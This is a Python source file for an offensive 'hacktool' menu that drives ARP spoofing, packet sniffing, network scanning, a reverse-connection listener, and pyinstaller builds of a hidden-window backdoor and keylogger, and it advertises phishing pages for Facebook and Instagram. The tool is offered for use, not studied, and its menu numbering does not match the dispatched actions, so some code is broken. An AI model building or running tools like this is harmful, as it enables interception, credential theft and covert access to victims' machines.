from mitm import arp_posion,netscanner,packet_sniffing
from Change_mac import mac
import os
import subprocess as sb
from Listener import listener
import re


a = """
    Welcome to hacktool

1-)Phishing
2-)Arpposion
3-)Netscanner
4-)sniff
5-)Keyloger from smtp
6-)Keyloger from ip
7-)Backdoor
8-)connection console
9-)Ransomware
10-)Changemac
11-)Backdoor
example: use 1

"""



def change_mac():
    interface = input("insert to interface:")
    input_mac = input("insert to mac:")
    mac.change_mac(interface,input_mac)


def netscan():
    ipadrr = input("input to ip addres example: 10.0.2.0/24:")
    netscanner.Scan(ipadrr)



def arp_spoof():
    target_ip = input("input target ip adress:")
    source_ip = input("input soruce ip adress:")
    arp = arp_posion.Mac()
    arp.arp_spf(target_ip,source_ip)

def Listen():
    ip = input("insert to ip address:")
    port = int(input("insert to port:"))
    listener.Listening(ip,port)

def sniff():
    iface = input("input interface:")
    sniffing = packet_sniffing.NetScan()
    sniffing.sniff(iface)

def Backdoor():
    sb.call(["pyinstaller","--onefile","-w","Bacdoor/my_socket.py"])
    
def keylogger():
    sb.call(["pyinstaller","--onefile","-w","keylogger.py"])

while True:
    print(a)
    user_input = input("input:")
    try:
        if  user_input == 'use 9':
            change_mac()
        elif user_input == 'use 3':
            netscan()
        elif user_input == 'use 2':
            sb.call(["echo","1",">","/proc/sys/net/ipv4/ip_forward"])
            arp_spoof()
        elif user_input == 'use 4':
            sniff()
        elif user_input == 'use 7':
            Listen()
        elif user_input == 'use 10':
            Backdoor()
        elif user_input == 'use 5':
            keylogger()
        elif user_input == 'use 1':
            print("After selecting the phishing method you want to choose and setting the webhook in the html file, you can run it on the server.for now only available for facebook and instagram will be added soon")
        elif user_input == 'exit' or user_input == 'EXIT':
            exit()
    except AttributeError:
        print('ERROR!')
    except ValueError:
        print("ERROR!")
    except KeyboardInterrupt:
        print("Exit")